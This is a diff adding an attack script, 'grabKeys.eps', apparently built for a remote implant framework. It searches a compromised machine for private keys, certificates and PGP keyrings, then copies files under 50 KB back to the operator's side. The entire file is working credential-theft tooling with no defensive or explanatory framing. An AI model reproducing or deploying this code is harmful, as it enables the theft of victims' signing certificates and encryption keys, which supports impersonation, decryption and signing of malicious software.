@@ -1,0 +1,55 @@
+#-------------------------------------------------------------------------------
+# File: grabKeys.eps
+# Description: look for files of interest
+#
+# v0.1 2009-08-06 Initial creation
+#-------------------------------------------------------------------------------
+@include "DropboxAPI.epm";
+@include "UseMarkers.epm";
+@echo off;
+@record on;
+string $getDir = GetEnv("_LPDIR_LOGS");
+string $names;
+string $paths;
+int $size;
+string $fileToGet;
+string $tempToCopy;
+int $i=0;
+int $j=0;
+#don't know how to do this on one line in EP...
+string $toFind = "*.p12";
+$toFind[1] = "*.pfx";
+$toFind[2] = "secring.pgp";
+$toFind[3] = "pubring.pgp";
+#$toFind[4] = "key3.db";
+#$toFind[5] = "cert8.db";
+$toFind[4] = "*.pvk";
+$toFind[5] = "*.spc";
+foreach $fileToGet($toFind){
+	`dir $fileToGet -path * -recursive -max 0`;
+	$names = GetCmdData("name");
+	$paths = GetCmdData("path");
+	$size = GetCmdData("size");
+	while($i < sizeof($names) ){
+		if($size[$i] >=50000){
+			#file should not be over 50k
+			$i++;
+			continue;
+		}
+		`copyget "$paths[$i]\\$names[$i]"`;
+		#need to copy to the dropbox so we can do something with it.
+		#the copy command doesn't allow wildcards, so we need a little extra work 
+		`local dir "$getDir\\Get_Files\\$names[$i]*"`;
+		$tempToCopy = GetCmdData("name");
+		while($j < sizeof($tempToCopy)){
+			CopyLocalFileToDropbox("KINGDOM","$getDir\\Get_Files\\$tempToCopy[$j]");
+			$j++;
+		}
+		$j=0;
+		$i++;
+	}
+	$i=0; 
+}
+setMarker("KINGDOM","grabKeys was successfully executed");
+
+return true;
